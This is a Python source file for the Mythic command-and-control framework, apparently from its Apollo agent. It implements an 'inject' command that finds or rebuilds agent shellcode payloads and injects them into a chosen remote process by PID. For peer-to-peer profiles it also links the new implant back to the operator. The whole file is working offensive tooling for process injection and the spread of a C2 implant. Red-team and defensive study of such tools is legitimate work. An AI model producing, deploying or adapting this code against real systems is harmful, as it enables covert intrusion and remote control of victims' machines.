from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import base64
import sys
import asyncio

class InjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_payloads),
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number),
        ]

    errorMsg = "Missing required parameter: {}"

    async def get_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=inputMsg.Callback,
            PayloadTypes=["apollo"],
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="apollo", BuildParameterValues={"output_type": "Shellcode"})]
        ))

        if payload_search.Success:
            file_names = []
            for f in payload_search.Payloads:
                file_names.append(f"{f.Filename} - {f.Description}")
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = payload_search.Error
            return fileResponse


    async def parse_arguments(self):
        if (self.command_line[0] != "{"):
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)
        if self.get_arg("pid") == 0:
            raise Exception("Required non-zero PID")


async def inject_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    return response


class InjectCommand(CommandBase):
    cmd = "inject"
    attributes=CommandAttributes(
        dependencies=["shinject"]
    )
    needs_admin = False
    help_cmd = "inject (modal popup)"
    description = "Inject agent shellcode into a remote process."
    version = 2
    script_only = True
    author = "@djhohnstein"
    argument_class = InjectArguments
    attackmapping = ["T1055"]
    completion_functions = {"inject_callback": inject_callback}

    async def create_tasking(self, task: MythicTask) -> MythicTask:

        string_payload = [x.strip() for x in task.args.get_arg("template").split(" - ")]
        filename = string_payload[0]
        desc = string_payload[1]
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=task.callback.id,
            PayloadTypes=["apollo"],
            Filename=filename,
            Description=desc,
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="apollo", BuildParameterValues={"output_type": "Shellcode"})]
        ))

        if not payload_search.Success:
            raise Exception("Failed to find payload: {}".format(task.args.get_arg("template")))

        if len(payload_search.Payloads) == 0:
            raise Exception("No payloads found matching {}".format(task.args.get_arg("template")))
        str_uuid = payload_search.Payloads[0].UUID
        newPayloadResp = await SendMythicRPCPayloadCreateFromUUID(MythicRPCPayloadCreateFromUUIDMessage(
            TaskID=task.id, PayloadUUID=str_uuid, NewDescription="{}'s injection into PID {}".format(task.operator, str(task.args.get_arg("pid")))
        ))
        if newPayloadResp.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                    PayloadUUID=newPayloadResp.NewPayloadUUID
                ))
                if resp.Success:
                    if resp.Payloads[0].BuildPhase == 'success':
                        # it's done, so we can register a file for it
                        task.display_params = "payload '{}' into PID {}".format(payload_search.Payloads[0].Description, task.args.get_arg("pid"))
                        task.status = MythicStatus.Processed
                        sys.stdout.flush()
                        c2_info = resp.Payloads[0].C2Profiles[0]
                        logger.info(c2_info)
                        is_p2p = c2_info.Name == "smb" or c2_info.Name == "tcp"
                        if not is_p2p:
                            response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                                         command="shinject", params_dict={"pid": task.args.get_arg("pid"), "shellcode-file-id": resp.Payloads[0].AgentFileId},
                                         subtask_callback_function="inject_callback")
                        else:
                            response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                                         command="shinject", params_dict={"pid": task.args.get_arg("pid"), "shellcode-file-id": resp.Payloads[0].AgentFileId})
                            if response.status == MythicStatus.Success:
                                connection_info = {
                                    "host": "127.0.0.1",
                                    "agent_uuid": newPayloadResp.NewPayloadUUID,
                                    "c2_profile": c2_info
                                }
                                print(connection_info)
                                sys.stdout.flush()
                                response = await MythicRPC().execute("create_subtask",
                                    parent_task_id=task.id,
                                    command="link",
                                    params_dict={
                                        "connection_info": connection_info
                                    }, subtask_callback_function="inject_callback")
                                task.status = response.status
                            else:
                                task.status = MythicStatus.Error
                            
                        break
                    elif resp.Payloads[0].BuildPhase == 'error':

                        raise Exception("Failed to build new payload ")
                    else:
                        await asyncio.sleep(1)
        else:
            logger.exception("Failed to build new payload")
            raise Exception("Failed to build payload from template {}".format(task.args.get_arg("template")))
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
